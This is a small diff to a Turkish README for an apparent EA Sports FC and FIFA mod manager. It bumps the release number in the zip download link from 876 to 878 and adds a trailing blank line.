@@ -12,7 +12,7 @@
 
 ## 📥 İndir
 
-**[FC-Mod-Manager-TR İndir](https://github.com/AttoConjurer/FC-Mod-Manager-TR/releases/download/876/FCModManagerTR.zip)**
+**[FC-Mod-Manager-TR İndir](https://github.com/AttoConjurer/FC-Mod-Manager-TR/releases/download/878/FCModManagerTR.zip)**
 
 
 ---
@@ -109,3 +109,4 @@ fc mod yöneticisi, fifa mod yöneticisi, ea sports fc modları, fc26 modları, 
     <img src="https://img.shields.io/badge/EA%20Sports%20FC%20ve%20FIFA%20topluluğuna%20❤️%20ile%20yapıldı-ff69b4?style=for-the-badge" alt="Made with love">
   </a>
 </p>
+
